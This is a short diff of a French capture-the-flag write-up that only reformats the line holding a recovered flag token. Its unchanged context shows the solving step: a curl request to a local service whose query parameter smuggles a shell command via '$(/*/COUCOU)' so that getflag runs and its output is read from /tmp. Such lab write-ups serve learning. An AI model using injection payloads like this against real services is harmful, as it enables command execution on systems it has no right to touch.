@@ -219,7 +219,8 @@ cat /tmp/COUCOU
 getflag > /tmp/ccc
 ```
 puis faire  `echo $(curl -s "http://localhost:4646?x='\$(/*/COUCOU)'") ; cat /tmp/ccc`
-on obtient g1qKMiRpXf53AWhDaU7FEkczr
+on obtient 
+`g1qKMiRpXf53AWhDaU7FEkczr`
 
 
 
